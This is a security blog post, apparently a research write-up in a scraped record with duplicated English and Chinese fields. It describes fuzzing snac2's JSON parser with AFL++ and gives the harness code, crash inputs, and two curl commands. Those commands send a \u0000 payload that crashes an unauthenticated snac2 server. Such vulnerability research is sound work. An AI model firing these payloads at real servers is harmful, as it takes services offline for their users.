title: Fuzzing for fun - unauthenticated denial of service in snac2
excerpt: Instead of manually inspecting the source code further, I've decided to employ a technique known as fuzzing in order to find inputs that may crash the parser (located in xs_json.h). If you're not familiar with fuzzing, it's essentially a method for testing code by supplying it with randomly generated inputs. In the most basic case, piping /dev/urandom to a program and waiting for it to crash is a very primitive form of fuzzing.
content_html:
Instead of manually inspecting the source code further, I've decided to employ a technique known as fuzzing in order to find inputs that may crash the parser (located in xs_json.h). If you're not familiar with fuzzing, it's essentially a method for testing code by supplying it with randomly generated inputs. In the most basic case, piping /dev/urandom to a program and waiting for it to crash is a very primitive form of fuzzing.

However, for more complex programs, just piping /dev/urandom to a program is going to be very inefficient, and will most likely take a very long time to detect some more complex patterns leading to crashes. Therefore, dedicated fuzzing programs such as AFL++ generate new inputs by using an initial corpus of valid inputs, which are continuously mutated through multiple strategies, employing a relatively complex genetic algorithm. Moreover, by employing compile-time binary instrumentation, a set of modified compilers can insert AFL-specific instructions, that can inform the fuzzer on how many functions and code paths are reached with a given input. Ultimately, this approach allows fuzzers to test as many available code paths as possible. This approach is so powerful, that even with a very trivial input corpus, AFL++ can start pulling JPEGs out of thin air when fuzzing a complete JPEG parser.

In snac2 project, I've decided to fuzz the xs_json_load function, which parses JSON data stored as a file (the fact that internally snac2 treats all data streams as FILE pointers is pretty fascinating too). In order to do that, I had to prepare a fuzzing harness - a very simple program which exposes the tested function to the fuzzer. In case of AFL++, I just needed a simple C program which reads a file path from argv[1], opens it, passes it to the parser, and then frees the result:

#include <stdio.h>

#define XS_IMPLEMENTATION
#include "xs.h"
#include "xs_json.h"


int main(int argc, char **argv) {
    if(argc < 2) return 0;

    FILE *f = fopen(argv[1], "r");

    xs_val *root = xs_json_load(f);

    if (root) {
        xs_free(root);
    }

    fclose(f);
    return 0;
}

In order to utilize AFL's binary instrumentation, I had to use a wrapped C compiler to create a binary. Assuming that we're conducting our research in a subdirectory within snac2's source tree:

afl-clang-fast -I.. fuzz_xs_json.c -o fuzz_xs_json

Afterwards, I've put a simple test case ({"company": "a", "year": 2024}) in the input directory and launched the fuzzer:

afl-fuzz -i input -o findings -- ./fuzz_xs_json @@

Within minutes, I've started seeing first crashes in findings/default/crashes directory, which I've managed to promptly confirm. Among some of the simpler detected cases, there's this one:

[
  "TSo\u0  So\uF  So\uFcccccc
Ag {

After a few minutes of tinkering, I've simplified the above test case to a much cleaner form (confirming that \u0000 is the reason behind the crash):

  ["", "dummy\u0000..........................AAAAAA

Ultimately, in order to confirm that it's a real crash, and not just something involving my fuzzing harness, I've decided to test this payload on a real, locally hosted snac2 server, by sending this to a MastoAPI endpoint (immediately crashing the server):

  curl -X POST -H "Content-Type: application/json" http://localhost:8001/api/v1/WHATEVER -d '["", "dummy\u0000..........................AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

After modifying the payload a bit, I've got the server to crash with standard ActivityPub endpoints as well:

  curl -X POST -H "Content-Type: application/activity+json" http://localhost:8001 -d '["", "dummy\u0000.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", ""]'

If you're not familiar with fuzzing, it's essentially a method for testing code by supplying it with randomly generated inputs. In the most basic case, piping /dev/urandom to a program and waiting for it to crash is a very primitive form of fuzzing.

sentences.en: Instead of manually inspecting the source code further, I've decided to employ a technique known as fuzzing in order to find inputs that may crash the parser (located in xs_json.h).
sentences.zh: 我决定采用一种称为模糊测试的技术来查找可能导致解析器崩溃的输入（位于 xs_json.h 中），而不是进一步手动检查源代码。

sentences.en: If you're not familiar with fuzzing, it's essentially a method for testing code by supplying it with randomly generated inputs.
sentences.zh: 如果您不熟悉模糊测试，它本质上是一种通过向代码提供随机生成的输入来测试代码的方法。

sentences.en: In the most basic case, piping /dev/urandom to a program and waiting for it to crash is a very primitive form of fuzzing.
sentences.zh: 在最基本的情况下，通过管道 /dev/urandom 到程序并等待它崩溃是一种非常原始的模糊测试形式。

blocks.html_en: However, for more complex programs, just piping /dev/urandom to a program is going to be very inefficient, and will most likely take a very long time to detect some more complex patterns leading to crashes. Therefore, dedicated fuzzing programs such as AFL++ generate new inputs by using an initial corpus of valid inputs, which are continuously mutated through multiple strategies, employing a relatively complex genetic algorithm. Moreover, by employing compile-time binary instrumentation, a set of modified compilers can insert AFL-specific instructions, that can inform the fuzzer on how many functions and code paths are reached with a given input. Ultimately, this approach allows fuzzers to test as many available code paths as possible. This approach is so powerful, that even with a very trivial input corpus, AFL++ can start pulling JPEGs out of thin air when fuzzing a complete JPEG parser.

sentences.en: However, for more complex programs, just piping /dev/urandom to a program is going to be very inefficient, and will most likely take a very long time to detect some more complex patterns leading to crashes.
sentences.zh: 然而，对于更复杂的程序，仅仅通过管道 /dev/urandom 到程序将非常低效，并且很可能需要很长时间才能检测到一些导致崩溃的更复杂的模式。

sentences.en: Therefore, dedicated fuzzing programs such as AFL++ generate new inputs by using an initial corpus of valid inputs, which are continuously mutated through multiple strategies, employing a relatively complex genetic algorithm.
sentences.zh: 因此，诸如 AFL++ 之类的专用模糊测试程序通过使用有效输入的初始语料库来生成新的输入，这些输入语料库通过多种策略不断变异，并采用相对复杂的遗传算法。

sentences.en: Moreover, by employing compile-time binary instrumentation, a set of modified compilers can insert AFL-specific instructions, that can inform the fuzzer on how many functions and code paths are reached with a given input.
sentences.zh: 此外，通过使用编译时二进制检测，一组修改后的编译器可以插入特定于 AFL 的指令，这些指令可以通知模糊器通过给定的输入达到了多少个函数和代码路径。

sentences.en: Ultimately, this approach allows fuzzers to test as many available code paths as possible.
sentences.zh: 最终，这种方法允许模糊器测试尽可能多的可用代码路径。

sentences.en: This approach is so powerful, that even with a very trivial input corpus, AFL++ can start pulling JPEGs out of thin air when fuzzing a complete JPEG parser.
sentences.zh: 这种方法非常强大，即使使用非常简单的输入语料库，AFL++ 也可以在模糊完整的 JPEG 解析器时开始凭空提取 JPEG。

sentences.zh: 最终，为了确认这是一次真正的崩溃，而不仅仅是涉及我的模糊测试工具的崩溃，我决定在真实的本地托管 snac2 服务器上测试此有效负载，方法是将其发送到 MastoAPI 端点（立即使服务器崩溃）：

sentences.en: After modifying the payload a bit, I've got the server to crash with standard ActivityPub endpoints as well:
sentences.zh: 稍微修改有效负载后，我的服务器也因标准 ActivityPub 端点而崩溃：

content_html_zh:
我决定采用一种称为模糊测试的技术来查找可能导致解析器崩溃的输入（位于 xs_json.h 中），而不是进一步手动检查源代码。 如果您不熟悉模糊测试，它本质上是一种通过向代码提供随机生成的输入来测试代码的方法。 在最基本的情况下，通过管道 /dev/urandom 到程序并等待它崩溃是一种非常原始的模糊测试形式。

然而，对于更复杂的程序，仅仅通过管道 /dev/urandom 到程序将非常低效，并且很可能需要很长时间才能检测到一些导致崩溃的更复杂的模式。 因此，诸如 AFL++ 之类的专用模糊测试程序通过使用有效输入的初始语料库来生成新的输入，这些输入语料库通过多种策略不断变异，并采用相对复杂的遗传算法。 此外，通过使用编译时二进制检测，一组修改后的编译器可以插入特定于 AFL 的指令，这些指令可以通知模糊器通过给定的输入达到了多少个函数和代码路径。 最终，这种方法允许模糊器测试尽可能多的可用代码路径。 这种方法非常强大，即使使用非常简单的输入语料库，AFL++ 也可以在模糊完整的 JPEG 解析器时开始凭空提取 JPEG。

在 snac2 项目中，我决定对 xs_json_load 函数进行模糊测试，该函数解析存储为文件的 JSON 数据（事实上 snac2 在内部将所有数据流视为 FILE 指针，这也非常令人着迷）。 为了做到这一点，我必须准备一个模糊测试工具 - 一个非常简单的程序，它将测试的函数暴露给模糊测试器。 对于 AFL++，我只需要一个简单的 C 程序，它从 argv[1] 读取文件路径，打开它，将其传递给解析器，然后释放结果：

#include <stdio.h>

#define XS_IMPLEMENTATION
#include "xs.h"
#include "xs_json.h"


int main(int argc, char **argv) {
    if(argc < 2) return 0;

    FILE *f = fopen(argv[1], "r");

    xs_val *root = xs_json_load(f);

    if (root) {
        xs_free(root);
    }

    fclose(f);
    return 0;
}

为了利用 AFL 的二进制工具，我必须使用封装的 C 编译器来创建二进制文件。 假设我们在 snac2 源代码树的子目录中进行研究：

afl-clang-fast -I.. fuzz_xs_json.c -o fuzz_xs_json

之后，我在输入目录中放入了一个简单的测试用例 ({"company": "a", "year": 2024}) 并启动了模糊器：

afl-fuzz -i input -o findings -- ./fuzz_xs_json @@

几分钟之内，我开始在 discovery/default/crashes 目录中看到第一次崩溃，我已经设法及时确认了这一点。 在一些检测到的较简单的案例中，有这样一个：

[
  "TSo\u0  So\uF  So\uFcccccc
Ag {

经过几分钟的修改，我将上述测试用例简化为更清晰的形式（确认 \u0000 是崩溃背后的原因）：

  ["", "dummy\u0000..........................AAAAAA

最终，为了确认这是一次真正的崩溃，而不仅仅是涉及我的模糊测试工具的崩溃，我决定在真实的本地托管 snac2 服务器上测试此有效负载，方法是将其发送到 MastoAPI 端点（立即使服务器崩溃）：

  curl -X POST -H "Content-Type: application/json" http://localhost:8001/api/v1/WHATEVER -d '["", "dummy\u0000..........................AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

稍微修改有效负载后，我的服务器也因标准 ActivityPub 端点而崩溃：

  curl -X POST -H "Content-Type: application/activity+json" http://localhost:8001 -d '["", "dummy\u0000.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", ""]'
